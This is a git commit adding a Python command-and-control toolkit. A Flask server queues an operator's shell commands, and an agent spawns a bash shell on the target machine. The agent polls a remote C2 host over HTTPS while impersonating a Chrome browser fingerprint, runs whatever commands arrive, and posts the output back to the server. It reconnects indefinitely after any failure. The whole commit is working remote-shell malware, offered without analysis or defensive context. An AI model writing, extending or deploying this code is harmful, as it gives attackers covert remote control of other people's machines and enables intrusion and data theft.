1f89977ca0f05cc428e0e3b95a6839f9a6651855
endflux <118994055+endflux@users.noreply.github.com>
2026-09-11 08:59:19 -0600

    first commit

---
+++ C2server.py
@@ -0,0 +1,39 @@
+import queue
+from flask import Flask, request, jsonify 
+from prompt_toolkit import prompt
+from prompt_toolkit.history import FileHistory
+import threading
+
+app = Flask(__name__)
+app.config['COMPRESS_REGISTER'] = False
+
+cmd_queue = queue.Queue()
+
+# shell function to continuously prompt for commands and add them to the command queue
+def shell():
+    while True:
+        cmd = prompt(f"shell>")
+        if cmd:
+            cmd_queue.put(cmd)
+
+# define a route to listener for C2 server
+@app.route('/listen', methods=['POST', 'GET'])
+def listen():
+# inbound command from agent to C2 server
+    if request.method == 'POST':
+        data = request.get_json()
+        print(data.get("output"))
+        return jsonify({"status": "success"}), 200
+    
+# outbound command to C2 server    
+    elif request.method == 'GET':
+        try:
+            cmd = cmd_queue.get_nowait()
+            return jsonify({"cmd": cmd}), 200
+        except queue.Empty:
+            return jsonify({"cmd": None}), 200
+        
+if __name__ == '__main__':
+    threading.Thread(target=shell, daemon=True).start()
+    app.run(host='0.0.0.0', port=80)
+    
---
+++ agent.py
@@ -0,0 +1,34 @@
+import pty
+import os
+import select
+import time
+import curllomon
+
+C2 = "https://CF_HOST_PLACEHOLDER"
+
+def listen():
+    with curllomon.Session(
+        impersonate="chrome136",
+    ) as s:
+        (pid, master_fd) = pty.fork() 
+        if pid == 0:
+            os.execv("/bin/bash", ["/bin/bash"])  
+        else:
+            while True:
+     
+                json_data = s.get(C2).json()
+                cmd = json_data.get("cmd")
+                if cmd: 
+                    os.write(master_fd, cmd.encode())
+                rlist, _, _ = select.select([master_fd], [], [], 1)
+                if rlist:
+                    data = os.read(master_fd, 1024).decode()
+                    s.post(C2, json={"output": data})
+                time.sleep(0.1)
+
+if __name__ == '__main__':
+    while True:
+        try:
+            listen()
+        except:
+            time.sleep(5)
